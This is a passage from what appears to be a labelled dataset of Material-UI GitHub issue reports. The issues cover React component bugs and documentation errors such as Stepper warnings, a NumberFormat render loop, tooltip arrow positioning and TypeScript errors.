codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nSee example: https://codesandbox.io/s/material-demo-yq0x1\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nThis is breaking all visual regression thats show progress bars.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.3  |\r\n| React        | v16.8.6 |\r\n| Browser      |  Chrome |\r\n"},{"labels":[null,"documentation",null],"text":"Stepper having two and more steps causing  Warnings : Received `false` for a non-boolean attribute `active` (and same for completed) inside internal SVG inside (probably) Step.js\r\n\r\n## Expected Behavior \r\nCreate simple stepper **with two and more steps** (having just one step causes no warnings), like:\r\n```\r\n<Stepper activeStep={this.state.stepIndex}  connector={<ArrowForwardIcon />}  >\r\n                    <Step key=\"1\">\r\n                        <StepLabel > bla1</StepLabel>\r\n                    </Step>\r\n                    <Step key=\"2\">\r\n                        <StepLabel > bla1</StepLabel>\r\n                    </Step>\r\n                </Stepper>\r\n```\r\nExpect to see no issues in console log.\r\n## Current Behavior \r\n```\r\nreact-dom.development.js:506 Warning: Received `false` for a non-boolean attribute `active`.\r\n\r\nIf you want to write it to the DOM, pass a string instead: active=\"false\" or active={value.toString()}.\r\n\r\nIf you used to conditionally omit it with active={condition && value}, pass active={condition ? value : undefined} instead.\r\n    in svg (created by ForwardRef(SvgIcon))\r\n    in ForwardRef(SvgIcon) (created by WithStyles(ForwardRef(SvgIcon)))\r\n    in WithStyles(ForwardRef(SvgIcon)) (created by ForwardRef)\r\n    in ForwardRef\r\n    in ForwardRef (created by OperationProgress)\r\n    in div (created by ForwardRef(Paper))\r\n    in ForwardRef(Paper) (created by WithStyles(ForwardRef(Paper)))\r\n    in WithStyles(ForwardRef(Paper)) (created by ForwardRef(Stepper))\r\n    in ForwardRef(Stepper) (created by WithStyles(ForwardRef(Stepper)))\r\n    in WithStyles(ForwardRef(Stepper)) (created by OperationProgress)\r\n    in div (created by OperationProgress)\r\n    in OperationProgress (created by ConnectFunction)\r\n    in ConnectFunction (created by Context.Consumer)\r\n    in withRouter(Connect(OperationProgress)) (created by OperationDashboardElement)\r\n    in div (created by ForwardRef(DialogContent))\r\n    in ForwardRef(DialogContent) (created by WithStyles(ForwardRef(DialogContent)))\r\n    in WithStyles(ForwardRef(DialogContent)) (created by OperationDashboardElement)\r\n    in div (created by ForwardRef(Paper))\r\n    in ForwardRef(Paper) (created by WithStyles(ForwardRef(Paper)))\r\n    in WithStyles(ForwardRef(Paper)) (created by ForwardRef(Dialog))\r\n    in div (created by Transition)\r\n...\r\n\r\n```\r\n\r\n```\r\nWarning: Received `true` for a non-boolean attribute `completed`.\r\n\r\nIf you want to write it to the DOM, pass a string instead: completed=\"true\" or completed={value.toString()}.\r\n    in svg (created by ForwardRef(SvgIcon))\r\n    in ForwardRef(SvgIcon) (created by WithStyles(ForwardRef(SvgIcon)))\r\n    in WithStyles(ForwardRef(SvgIcon)) (created by ForwardRef)\r\n    in ForwardRef\r\n    in ForwardRef (created by OperationProgress)\r\n    in div (created by ForwardRef(Paper))\r\n    in ForwardRef(Paper) (created by WithStyles(ForwardRef(Paper)))\r\n    in WithStyles(ForwardRef(Paper)) (created by ForwardRef(Stepper))\r\n    in ForwardRef(Stepper) (created by WithStyles(ForwardRef(Stepper)))\r\n    in WithStyles(ForwardRef(Stepper)) (created by OperationProgress)\r\n    in div (created by OperationProgress)\r\n    in OperationProgress (created by ConnectFunction)\r\n    in ConnectFunction (created by Context.Consumer)\r\n    in withRouter(Connect(OperationProgress)) (created by OperationDashboardElement)\r\n    in div (created by ForwardRef(DialogContent))\r\n    in ForwardRef(DialogContent) (created by WithStyles(ForwardRef(DialogContent)))\r\n    in WithStyles(ForwardRef(DialogContent)) (created by OperationDashboardElement)\r\n    in div (created by ForwardRef(Paper))\r\n    in ForwardRef(Paper) (created by WithStyles(ForwardRef(Paper)))\r\n    in WithStyles(ForwardRef(Paper)) (created by ForwardRef(Dialog))\r\n    in div (created by Transition)\r\n    in Transition (created by ForwardRef(Fade))\r\n    in ForwardRef(Fade) (created by WithTheme(ForwardRef(Fade)))\r\n    in WithTheme(ForwardRef(Fade)) (created by TrapFocus)\r\n    in TrapFocus (created by Modal)\r\n    in div (created by Modal)\r\n    in ForwardRef(Portal) (created by Modal)\r\n    in Modal (created by ForwardRef(Modal))\r\n    in ForwardRef(Modal) (created by WithTheme(ForwardRef(Modal)))\r\n    in WithTheme(ForwardRef(Modal)) (created by ForwardRef(Dialog))\r\n    in ForwardRef(Dialog) (created by WithStyles(ForwardRef(Dialog)))\r\n    in WithStyles(ForwardRef(Dialog)) (created by OperationDashboardElement)\r\n    in div (created by Styled(MuiBox))\r\n    in Styled(MuiBox) (created by OperationDashboardElement)\r\n    in OperationDashboardElement (created by ConnectFunction)\r\n    in ConnectFunction (created by Context.Consumer)\r\n    in withRouter(Connect(OperationDashboardElement)) (created by AppMaster)\r\n    in div (created by AppMaster)\r\n...\r\n```\r\n\r\n\r\n## Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.1  |\r\n| React        |    v16.8.6     |\r\n| Browser      |   Chrome      |\r\n| TypeScript   |    v3.4.5     |\r\n\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nTextField or InputBase components wrapped in FormControl values can get out of sync with react-number-format component and cause render loops.\r\n\r\nI am starting here, but I am a little torn where this issue should live. Recently I upgraded a project from MUIv3 to MUIv4, and one of our e2e tests(cypress) started failing. After some digging, I found an issue with MUIv4 and react-number-format when using TextField components (InputBase wrapped in FormControl). \r\n\r\n**Description of issue:** \r\nGiven a TextField with custom input of NumberFormat is empty and a user types two or more characters very fast (mash keys or e2e tests with very low delay), the TextField and Number format components get out of sync and cause a render loop.\r\n\r\n**Why This happens**\r\n\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nRender loop does not happen.\r\n\r\n## Current Behavior 😯\r\nGiven a TextField with custom input of NumberFormat is empty and a user types two or more characters very fast (mash keys or e2e tests with very low delay), the TextField and Number format components get out of sync and cause a render loop. React number format uses a combination of componetDidUpdate and internal state to track the formatted value. it also, given the right conditions, emits the onValueChange if the props value does not match the state. The render loop happens due to FormControl context updating fill at the same time that react-number-format is waiting for its setState callback to fire. Once the setState callback fires react-number-format thinks the value reverted back to the previous value and emits another onChange.\r\n\r\nRender/Update logs:\r\n```\r\nnumber_format.js:921 number_format ENQUEUE STATE VALUE $1\r\nnumber_format.js:1166 number_format propsValue \r\nnumber_format.js:1167 number_format stateValue $1\r\nnumber_format.js:214 number_format DIDUPDATE-prevPropsValue \r\nnumber_format.js:215 number_format DIDUPDATE-currentPropsValue \r\nnumber_format.js:928 number_format STATE CALLBACK VALUE $1\r\nFormattedInputs.js:49 NUMBERFORMATCUSTOM changeValue 1\r\nFormattedInputs.js:81 DEMO value 1\r\nTextField.js:16 TEXTFIELD value 1\r\nFormControl.js:168 FormControl context {... filled: false, …}\r\nInputBase.js:190 INPUTBASE value 1\r\nFormattedInputs.js:43 NUMBERFORMATCUSTOM value 1\r\nnumber_format.js:1166 number_format propsValue 1\r\nnumber_format.js:1167 number_format stateValue $1\r\nnumber_format.js:214 number_format DIDUPDATE-prevPropsValue \r\nnumber_format.js:215 number_format DIDUPDATE-currentPropsValue 1\r\nnumber_format.js:921 number_format ENQUEUE STATE VALUE $12\r\nFormControl.js:11 FORMCONTROL handleDirty\r\nFormControl.js:11 FORMCONTROL handleDirtyIsFilled\r\nFormControl.js:168 FormControl context {... filled: true, …}\r\nInputBase.js:190 INPUTBASE value 1\r\nFormattedInputs.js:43 NUMBERFORMATCUSTOM value 1\r\nnumber_format.js:1166 number_format propsValue 1\r\nnumber_format.js:1167 number_format stateValue $12\r\nnumber_format.js:214 number_format DIDUPDATE-prevPropsValue 1\r\nnumber_format.js:215 number_format DIDUPDATE-currentPropsValue 1\r\nnumber_format.js:921 number_format ENQUEUE STATE VALUE $1\r\nnumber_format.js:928 number_format STATE CALLBACK VALUE $12\r\nFormattedInputs.js:49 NUMBERFORMATCUSTOM changeValue 12\r\nFormControl.js:11 FORMCONTROL handleDirty\r\n...\r\n```\r\n\r\n## Steps to Reproduce 🕹\r\n1. Navigate to https://material-ui.com/components/text-fields/#formatted-inputs\r\n2. Clear the react-number-format input (the currency input)\r\n3. Mash 2+ number keys quickly.\r\n4. The docs should crash.\r\n\r\nMinimal Codesandbox without MUI (mimics the FormControl context update)\r\nhttps://codesandbox.io/s/react-number-minimal-bjfn3\r\nAs a side note using `useLayoutEffect` instead of `useEffect` for the dirty check fixes the issue (removes the extra render).\r\n\r\nMinimal Codesandbox with MUI\r\nhttps://codesandbox.io/s/react-number-format-phone-number-z1950\r\n\r\n## Context 🔦\r\nWe are using react-number-format for phone and currency inputs. While the issue for the most part an edge case (who really types that fast) it could cause some serious issues. I largely believe the issue lies with how react-number-format tracks state internally and fires updates, but this did work in MUIv3 and the current demo is broken.\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.3  |\r\n| React        |  v16.8.6       |\r\n| Browser      |     Chrome    |\r\n| react-number-format |  v4.0.8 |"},{"labels":["documentation",null],"text":"On the homepage (https://material-ui.com) under *Installation*, the suggestion is to install `@next`. Is this a bug?\r\n\r\nI would expect to install the normal stable version of material-ui.\r\n\r\n![Image](https://user-images.githubusercontent.com/12324017/60348996-f8e46900-99c0-11e9-9435-8c0208db77f6.png)\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nTooltip's arrow sample below is broken since 4.1.2. Arrow position will get shifted as soon as it gets rendered.\r\nhttps://material-ui.com/components/tooltips/#customized-tooltips\r\n\r\nI've confirmed it was working fine until 4.1.1 and after checking 4.1.2 release note, I found this change was affected. Also confirmed by directly editing 'transform' styles in Chrome DevTool.\r\nhttps://github.com/mui-org/material-ui/pull/16297/files\r\n\r\nI believe the transition components should care about this arrow use case or those samples in the official website should be fixed.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nEither transition components to be fixed, or provide new arrow working sample as expected.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nArrow gets shifted to unexpected position after rendered.\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: https://material-ui.com/components/tooltips/#customized-tooltips\r\n\r\nWith 4.1.3 (not working)\r\nhttps://codesandbox.io/s/rmmr8\r\n\r\nWith 4.1.1 (working as expected)\r\nhttps://codesandbox.io/s/material-demo-ds9h8\r\n\r\n1. Just hover on ARROW or BOOTSTRAP sample\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.2 and above  |\r\n| React        | v16.8        |\r\n| Browser      |  Chrome       |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"This seems like a revival of #9027, and causes event handlers which expect to be passed an event object to fail, since it'll be `undefined`.\r\n\r\nThe offending line of code is here:\r\nhttps://github.com/mui-org/material-ui/blob/46af75d63b249e24872d481c99ceaa9d4a5f6e21/packages/material-ui/src/InputBase/InputBase.js#L223\r\n\r\nThis might have been introduced in the conversion to a function component, but I am unsure.\r\nThe previous fix was simply passing {} as the event object as it'll at least fix the direct issue of accessing properties of `undefined`.\r\n"},{"labels":["documentation",null],"text":"- [x] This is not a v0.x issue.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nI believe this is linked to #14561 though, but as it's already merged, I think it needs a new issue.\r\n\r\n## Expected Behavior 🤔\r\nThe description for the `size` property should be:\r\n> Specify the size of the cell. By default, the Table parent component set the value (`medium`).\r\n\r\nThe description for the CSS class `sizeSmall` should be:\r\n> Styles applied to the root element if `size=\"small\"`.\r\n\r\n## Current Behavior 😯\r\nFor the `size` property, the description is:\r\n> Specify the size of the cell. By default, the Table parent component set the value (`normal`).\r\n\r\nFor the CSS class `sizeSmall`, the description is:\r\n> Styles applied to the root element if `padding=\"dense\"`.\r\n\r\n\r\n\r\n## Steps to Reproduce 🕹\r\nLink: [TableCell's doc](https://material-ui.com/api/table-cell/)\r\n\r\n1. In _Props_, look for `size` property's description\r\n2. In _CSS_, look for `sizeSmall` class' description\r\n\r\n## Context 🔦\r\nI was following the [v3 to v4 migration guide, part about Table/TableCell](https://material-ui.com/guides/migration-v3/#table) and went to the [TableCell's doc](https://material-ui.com/api/table-cell).\r\n\r\n## Your Environment 🌎\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.3  |\r\n| React        | v16.8.6        |\r\n| Browser      | Firefox 67.0.4        |\r\n\r\n**Edit**: Modified issue to use Bug report template, even if it's not really a bug, nor a feature request, but more a doc improvement suggestion."},{"labels":[null,"documentation",null],"text":"The display numbers are off in TablePagination\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nDisplayed record range should not be higher than the max number of records. It would be preferable if the page number were reset to the first page when modifying the number of records per page.\r\n\r\n\r\n## Current Behavior 😯\r\n\r\nTable is cleared and pagination says it's displaying records 51 through 13. \r\n\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n1. go to https://material-ui.com/components/tables/#custom-table-pagination-action\r\n2. select 5 records per page\r\n3. navigate to the last page\r\n4. select 25 records per page. You’ll see the table go blank and the record count switch to `51-13`. There are only 13 records so we should never see record 51.\r\n\r\n\r\n## Context 🔦\r\nTrying to have a table that isn't buggy\r\n\r\n## Your Environment 🌎\r\nI can recreate this issue on the MUI page \r\nhttps://material-ui.com/components/tables/"},{"labels":["documentation",null],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nNo compile errors\r\n\r\n## Current Behavior 😯\r\n/nextjs-with-typescript/src/Link.tsx\r\nError:(10, 11) TS2339: Property 'as' does not exist on type '{ children?: ReactNode; }'.\r\nError:(10, 15) TS2339: Property 'href' does not exist on type '{ children?: ReactNode; }'.\r\nError:(10, 21) TS2339: Property 'prefetch' does not exist on type '{ children?: ReactNode; }'.\r\nError:(14, 10) TS2322: Type 'Ref<unknown>' is not assignable to type 'string | ((instance: HTMLAnchorElement | null) => void) | RefObject<HTMLAnchorElement> | null | undefined'.\r\n  Type 'RefObject<unknown>' is not assignable to type 'string | ((instance: HTMLAnchorElement | null) => void) | RefObject<HTMLAnchorElement> | null | undefined'.\r\n    Type 'RefObject<unknown>' is not assignable to type 'RefObject<HTMLAnchorElement>'.\r\n      Type 'unknown' is not assignable to type 'HTMLAnchorElement'.\r\nError:(19, 14) TS2339: Property 'propTypes' does not exist on type 'ForwardRefExoticComponent<RefAttributes<unknown>>'.\r\nError:(27, 15) TS7006: Parameter 'props' implicitly has an 'any' type.\r\n\r\n## Steps to Reproduce 🕹\r\nRun `tsc` in the checked out directory.\r\n"},{"labels":[null,null,"documentation",null],"text":"So, in general I would be the advocate for handling internationalisation in the business logic of an app rather than on a component level, which is why it's a little bit surprising to see MUI deal with some of it through enforcing it in the component. Let me elaborate...\r\n\r\n## Expected Behavior 🤔\r\nIn an app, when I change the language all aria type properties and accessibility related strings should be translatable through any means a developer wishes to.\r\n\r\n## Current Behavior 😯\r\nAccessibility related strings come baked into the component and get translated ONLY if the browser language is changed. While this is indeed the more common scenario, it isn't the only one, and users might want to change the language of an app/site without changing the OS language, either because that's what the want to do, or because they have no access to those settings (school, library, internal IT policies, etc)\r\n\r\n## Context 🔦\r\nThe goal is an application that has language options just like the MUI site has. Btw, the MUI site suffers from the same issue. One the language is changed to Spanish for example, pretty much all strings translate except the ones for accessibility. \r\n\r\n## Your Environment 🌎\r\nALL\r\n"},{"labels":[null,"documentation",null],"text":"here's the reproduction: https://codesandbox.io/s/nextjs-inufq\r\n\r\nyou can see when loading the index page, the red background color flashes into the screen after loading"},{"labels":["documentation",null],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nn/a\r\n\r\n## Current Behavior 😯\r\nWhen I read docs about [makeStyles(styles, [options])](https://material-ui.com/styles/api/#makestyles-styles-options-hook) I found strange option `withTheme`:\r\n\r\n> options.withTheme (Boolean [optional]): Defaults to false. Provide the theme object to the component as a property.\r\n\r\nBut hos it's possible for a hook function, which return a classes object? From my point of view, it is copy-paste from `withStyles()` HOC where it has sense!\r\n\r\n\r\n\r\n## Steps to Reproduce 🕹\r\nn/a\r\n\r\n## Context 🔦\r\nn/a\r\n\r\n## Your Environment 🌎\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.0  |\r\n"},{"labels":[null,"documentation"],"text":"### Description\r\nThe steps to get CSS styles when doing server rendering has changed from v3 to v4, and is now using `ServerStyleSheets` from `@material-ui/styles`.\r\n\r\nAlthough it is a big breaking change (broken styles in the served page from SSR with old code), there is no mention of how to migrate from v3 `SheetsRegistry` to v4 `ServerStyleSheets` nor any mention of this breaking change in the migration guide.\r\n\r\nAs someone migrating from v3 to v4, I would at least expect to know about this breaking change and be guided with steps to have an effortless migration to v4."},{"labels":["documentation",null,null],"text":"https://material-ui.com/ru/customization/spacing :\r\n\r\nin English looks like:\r\n\r\n![изображение](https://user-images.githubusercontent.com/1157412/59290650-7bb3b700-8c92-11e9-9565-cdc9720f575f.png)\r\n\r\nin Russian it looks even more weird:\r\n\r\n![изображение](https://user-images.githubusercontent.com/1157412/59290691-971ec200-8c92-11e9-86e8-d2133a412bfb.png)\r\n\r\n\r\n============\r\n\r\nAlso, it seems, this `spacing` does not work. Please provide a complete example of usage. I can not reproduce it on latest MaterialUI.\r\n"},{"labels":[null,"documentation",null],"text":"The server-sided rendering example in the useMediaQuery documentation does not seem to work.\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nThe example provided in the documentation should display `true` when Javascript is disabled.\r\n\r\n## Current Behavior 😯\r\nIt always displays false when Javascript is disabled, despite the \"estimated width\" constant being 800px (greater than the 600px in the media query).\r\n\r\n## Steps to Reproduce 🕹\r\nLink: https://material-ui.com/components/use-media-query/#server-side-rendering\r\n\r\n1. Visit the above link\r\n2. Disable Javascript\r\n3. Refresh the page\r\n4. Observe that the match displays `false`.\r\n\r\n## Context 🔦\r\nThis prevents adding SSR support using `useMediaQuery`. ☹️ \r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.2  |\r\n| React        |  v16.8.6  |\r\n| Browser      |  Chrome 74 |\r\n| TypeScript   |  v3.5.1  |\r\n| etc.         |         |\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nDocs should not have duplicate content.\r\n\r\n\r\n## Current Behavior 😯\r\n\r\nThe Accessibility section of the Icons page contains two \"Decorative SVG Icons\" and \"Decorative SVG Icons\"\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://material-ui.com/components/icons/\r\n\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.?.?  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nChips in a Chip Array should be removed on clicking _x_\r\nBy looking over the example for [Chip Array](https://material-ui.com/components/chips/#chip-array). We see Chips do not get removed as expected.\r\n\r\n## Current Behavior 😯\r\nNo Chips are being removed.\r\n\r\n## Steps to Reproduce 🕹\r\nTaking the [CodeSandBox](https://codesandbox.io/s/material-demo-jz4s4?fontsize=14) from the example we see the problematic behaviour.\r\n\r\n## _Hacky_ Solution 🛠\r\nThe problem here is that, since we are using the setState hook, while the array **does** get updated, the page itself will **not** update to show this change.\r\nThis is because the React engine will ['bail out of update'](https://reactjs.org/docs/hooks-reference.html#bailing-out-of-a-state-update). And not show the change made to the array.\r\n\r\nUnder **class**ic React, a way to solve this would be to use [`forceUpdate()`](https://reactjs.org/docs/react-component.html#forceupdate). Except the example given uses hooks. Therefore we must use a workaround, as detailed in the [React docs](https://reactjs.org/docs/hooks-faq.html#is-there-something-like-forceupdate):\r\n\r\n![image](https://user-images.githubusercontent.com/7355538/58996888-fd6a9700-87f1-11e9-939d-e5a8f4766998.png)\r\n\r\nSo here is a [CodeSandBox](https://codesandbox.io/s/material-demo-j38l1?fontsize=14) with the solution implemented and working.\r\nExcept this is a messy, hacky solution, which the React docs also mention. So it seems a little unsuitable for a basic usage example. Which is the reason I have created an Issue, and not a Pull Request.\r\n\r\nSo instead, would there be a proper way to fix this? Or perhaps a simpler workaround? Or otherwise could something internal to Material-UI be changed?\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.0.1  |\r\n| React        |  16.8.6  |\r\n| Browser      | Reproduced on Firefox, Chromium |"},{"labels":["documentation",null,null],"text":"\r\nWhen I inject withMobileDialog into a React component, I cannot access members of the component.\r\n\r\nI've tried dive, Material UI shallow, mount, enzyme shallow and mount to no avail.\r\n\r\nWithout injecting withMobileDialog, I can access the members without a problem.\r\n\r\nHow do I access members on the component when using withMobileDialog()\r\n\r\nComponent\r\n```\r\nclass Blog extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.state = {\r\n      open: false\r\n    };\r\n    this.postCount = 5;\r\n    this.posts = this.getPosts();\r\n  }\r\n\r\n  setOpen = () => {\r\n    if (this.showPosts()) {\r\n      this.setState({ open: true });\r\n    }\r\n  };\r\n\r\n\r\n  render() {\r\n    return (\r\n      ...\r\n    );\r\n  }\r\n}\r\n\r\nexport default compose(\r\n  observer,\r\n  withStyles(styles),\r\n  withMobileDialog()\r\n)(Blog);\r\n```\r\n\r\n\r\nTest\r\n```\r\nimport React from 'react';\r\n//import { mount } from 'enzyme';\r\nimport Blog from '../blog';\r\nimport { Switch, Redirect } from 'react-router-dom';\r\nimport sinon from 'sinon';\r\nimport blog from '../blog';\r\nimport { createShallow, createMount } from '@material-ui/core/test-utils';\r\n\r\ndescribe('Blog', () => {\r\n  let blogWrapper, shallow, mount;\r\n  beforeEach(() => {\r\n    shallow = createShallow(); \r\n    mount = createMount();\r\n  });\r\n\r\n  it('should render private page with its router', () => {\r\n\r\n\r\n\r\n    blogWrapper = shallow(\r\n      <Blog\r\n\r\n      />\r\n    );\r\n\r\n    // setOpen is undefined\r\n    const toggleSpy = jest.spyOn(blogWrapper.instance(), 'setOpen');\r\n\r\n    expect(blogWrapper.state.open).toBeTrue();\r\n  });\r\n\r\n});\r\n```\r\n"},{"labels":["documentation",null],"text":"I have below code to use `Select` component but I get type error when upgrading to 4.0.2.\r\n\r\n```\r\nimport Select from '@material-ui/core/Select';\r\n\r\n<Select\r\n            native\r\n            value={selectedValue}\r\n            onChange={(e) => onChange(e.target.value)}\r\n            \r\n          >\r\n```\r\nThis is the error about `e.target.value` parameter. It says the value is `unknown`.\r\n\r\n```\r\nArgument of type 'unknown' is not assignable to parameter of type 'string'.\r\n```"},{"labels":["documentation"],"text":"Hey guys,\r\n\r\nI can't help to notice that all the `menu in the doc` are not written in `.md` file so that crowdin cannot pick it up or lists as one of the files needed to be translated. Currently all the docs for `translation` formatted as `.json` which makes sense but still require to have a corresponding `.md` file to catch up updates from different languages.\r\n\r\nIt was done before at one stage, now I couldn't find any of the docs for menu in crowdin in these:\r\nhttps://crowdin.com/translate/material-ui-docs/1570/en-zhcn,\r\nhttps://crowdin.com/translate/material-ui-docs/1570/en-de,\r\nhttps://crowdin.com/translate/material-ui-docs/1570/en-ptbr,\r\n\r\nbut these: \r\nhttps://crowdin.com/translate/material-ui-docs/1570/en-fr\r\nhttps://crowdin.com/translate/material-ui-docs/1570/en-es,\r\n(they are not up-to-date anyway).\r\n\r\nSo can we have the doc imported and synced ? Thanks.\r\n"},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nWhen applying a class to override the default style for an expansion panel, the override is applied\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\noverride is not applied\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: 